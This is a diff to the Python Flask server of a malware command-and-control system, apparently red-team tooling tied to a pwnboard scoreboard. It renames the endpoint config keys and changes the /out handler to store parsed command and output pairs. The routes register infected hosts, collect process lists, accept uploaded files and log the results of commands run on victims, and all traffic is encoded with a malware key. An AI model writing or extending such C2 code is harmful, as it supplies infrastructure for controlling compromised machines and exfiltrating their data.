@@ -16,7 +16,7 @@ from c2.pwnboard.pwnboard import send_update
 from c2.util import mal_encode, mal_decode, file_decrypt
 
 
-@app.route(app.config['ENDPOINT_HEARTBEAT'], methods=['POST'])
+@app.route(app.config['ENDPOINTS']['HEARTBEAT'], methods=['POST'])
 @app.route('/heartbeat', methods=['POST'])
 def heartbeat():
     """
@@ -60,7 +60,7 @@ def heartbeat():
         return mal_encode(app.malware_key, "1")
 
 
-@app.route(app.config['ENDPOINT_INFO'], methods=['POST'])
+@app.route(app.config['ENDPOINTS']['INFO'], methods=['POST'])
 @app.route('/info', methods=['POST'])
 def info():
     """
@@ -89,7 +89,7 @@ def info():
             return mal_encode(app.malware_key, "Success")
 
 
-@app.route(app.config['ENDPOINT_PS'], methods=['POST'])
+@app.route(app.config['ENDPOINTS']['PS'], methods=['POST'])
 @app.route('/ps', methods=['POST'])
 def ps():
     """
@@ -108,7 +108,7 @@ def ps():
             return mal_encode(app.malware_key, "Successfully updated process list")
 
 
-@app.route(app.config['ENDPOINT_UPLOAD'], methods=['POST'])
+@app.route(app.config['ENDPOINTS']['UPLOAD'], methods=['POST'])
 @app.route('/upload', methods=['POST'])
 def upload():
     """
@@ -140,7 +140,7 @@ def upload():
     return mal_encode(app.malware_key, "Something went wrong")
 
 
-@app.route(app.config['ENDPOINT_OUT'], methods=['POST'])
+@app.route(app.config['ENDPOINTS']['OUT'], methods=['POST'])
 @app.route('/out', methods=['POST'])
 def out():
     """
@@ -154,6 +154,8 @@ def out():
         else:
             conn = get_db()
             out_string = mal_decode(app.malware_key, request.data)
-            print(len(request.data), out_string, request.cookies['X-Session-ID'])
-            db.update_commandout(conn, request.cookies['X-Session-ID'], out_string)
+            parsed = json.loads(out_string)
+            command = parsed["command"]
+            output = parsed["output"]
+            db.update_commandout(conn, request.cookies['X-Session-ID'], command, output)
             return mal_encode(app.malware_key, "Output updated successfully")
